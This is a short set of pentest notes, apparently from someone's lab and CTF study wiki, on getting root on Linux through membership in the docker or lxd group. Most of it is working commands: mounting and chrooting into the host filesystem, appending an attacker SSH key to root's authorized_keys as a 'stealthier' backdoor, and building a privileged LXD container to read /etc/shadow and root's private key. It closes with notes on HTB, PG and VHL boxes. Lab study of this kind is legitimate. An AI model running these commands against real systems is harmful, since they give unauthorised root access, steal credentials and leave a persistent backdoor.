# Docker / LXD Group Privilege Escalation

Back to [[Linux-PrivEsc-Methodology]]

## Check Group Membership
```bash
id
groups
```

---

## Docker (user in `docker` group)

### Mount Host Filesystem
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

### No Internet? Use Existing Images
```bash
docker images
docker run -v /:/mnt --rm -it IMAGE_NAME chroot /mnt bash
```

### Writable Docker Socket
```bash
ls -la /var/run/docker.sock
```
If writable:
```bash
docker run -v /:/host --rm -it alpine chroot /host bash
```

### Add SSH Key as Root (stealthier)
```bash
docker run -v /root/.ssh:/mnt --rm -it alpine sh -c 'echo "YOUR_PUBLIC_KEY" >> /mnt/authorized_keys'
ssh root@TARGET_IP
```

---

## LXD (user in `lxd` group)

### On Kali -- Build Alpine Image
```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo bash build-alpine
# Produces alpine-v*.tar.gz
```

### Transfer Image to Target, Then:
```bash
lxc image import alpine-v*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/bash
```

Root filesystem is at `/mnt/root/`:
```bash
cat /mnt/root/etc/shadow
cat /mnt/root/root/.ssh/id_rsa
echo 'YOUR_PUBLIC_KEY' >> /mnt/root/root/.ssh/authorized_keys
```

---

## From Your Boxes

> **Web01** (VHL) — User was in the docker group
> - What worked: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
> - Lesson: Docker group membership = root. This one-liner mounts the host filesystem and chroots into it. Memorize it.

> **Peppo** (PG) — User eleanor was in the docker group inside a restricted shell
> - What worked: `docker run -v /:/mnt --rm -it redmine chroot /mnt sh`
> - Lesson: Same docker breakout technique, but use whatever image is already on the box (redmine here, alpine on Web01). Run `docker images` to see what is available.

> **Tabby** (HTB) — User ash was in the lxd group
> - What worked: Built lxd-alpine image on Kali, transferred it, imported as image, then launched container with root filesystem mounted
> - Lesson: LXD requires more steps than Docker. Build the alpine image with `lxd-alpine-builder` on Kali, transfer, then: `lxc image import`, `lxc init`, `lxc config device add`, `lxc start`, `lxc exec`.
